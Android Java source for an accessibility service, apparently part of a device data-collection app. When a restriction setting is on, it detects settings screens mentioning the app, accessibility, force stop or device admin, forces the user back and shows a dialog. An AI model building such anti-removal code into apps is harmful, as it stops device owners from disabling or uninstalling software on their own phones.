package android.iocl.dac_collector.Services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.Path;
import android.iocl.dac_collector.R;
import android.iocl.dac_collector.Ui.DialogActivity;
import android.iocl.dac_collector.Ui.MainActivity;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.WakeupHelper;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class AcessibilitySettings extends AccessibilityService {
    public static final String CUSTOM_ACTION = "com.example.mybroadcastapp.CUSTOM_ACTION";
    private static final String CHANNEL_ID = "AccessibilitySettingsID";
    private static final String TAG = "AccessibilitySettings";
    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (CUSTOM_ACTION.equals(intent.getAction())) {
                clickBackButton();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    simulateBackGesture();
                }
            }
        }
    };

    // 1) Define handler interface
    public interface AccessibilityHandler {
        void handleEvent(AccessibilityService service, AccessibilityEvent event);
    }

    // 2) Registry of brand-specific handlers
    private final Map<String, AccessibilityHandler> handlerMap = new HashMap<>();

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        // Wake up or keep alive service
        WakeupHelper.wakeupAppService(getApplicationContext());


        // Register brand handlers
        handlerMap.put("realme", this::handleRealmeVivo);
        handlerMap.put("vivo",  this::handleRealmeVivo);
        handlerMap.put("samsung", this::handleSamsung);
        // Add more brands as needed

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 100;
        setServiceInfo(info);

        IntentFilter filter = new IntentFilter(CUSTOM_ACTION);
        registerReceiver(receiver, filter);
        Log.d(TAG, "BroadcastReceiver registered");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
        if (!SharedPrefs.getRestrictionEnabled(this)) return;

        String brand = Build.BRAND.toLowerCase(Locale.US);
        AccessibilityHandler handler = handlerMap.get(brand);
        if (handler != null) {
            handler.handleEvent(this, event);
        } else {
            Log.d(TAG, "No handler for brand=" + brand);
        }
    }

    @Override
    public void onInterrupt() {
        unregisterReceiver(receiver);
    }

    // 3) Brand-specific logic
    private void handleRealmeVivo(AccessibilityService service, AccessibilityEvent event) {
        String cls = event.getClassName() != null
                ? event.getClassName().toString().toLowerCase(Locale.US)
                : "";
        String text = !event.getText().isEmpty()
                ? event.getText().toString().toLowerCase(Locale.US)
                : "";


        Log.d(TAG,  "Event - " + event + " | cls - " +  cls  + " | txt - " + text);

        if (cls.contains("notification")){return;}
        if (cls.contains("android.iocl.dac_collector")){ return;};

        boolean appNameMatch = text.contains(getString(R.string.app_name).toLowerCase(Locale.US));
        boolean accessibilityMatch = text.contains("accessibility");
        boolean forceStopMatch = text.contains("force stop");
        boolean adminMatch = cls.contains("admin");

        if ((appNameMatch || accessibilityMatch || forceStopMatch || adminMatch)
                && !text.contains("notification")
                && !text.contains("volume")) {

            clickBackButton();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) simulateBackGesture();

            Intent intent = new Intent(getApplicationContext(), DialogActivity.class);
            intent.addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK |
                            Intent.FLAG_ACTIVITY_CLEAR_TOP |
                            Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            );
            startActivity(intent);
        }
    }

    //

    private void handleSamsung(AccessibilityService service, AccessibilityEvent event) {
        Log.d(TAG, "Samsung-specific logic can go here");
        // Example: just log or show a Toast
    }

    // 4) Helpers
    public void clickBackButton() {
        performGlobalAction(GLOBAL_ACTION_BACK);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public void simulateBackGesture() {
        Path path = new Path();
        path.moveTo(1000, 2000);
        path.lineTo(100, 2000);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        GestureDescription description = builder
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 200))
                .build();
        dispatchGesture(description, null, null);
    }





}
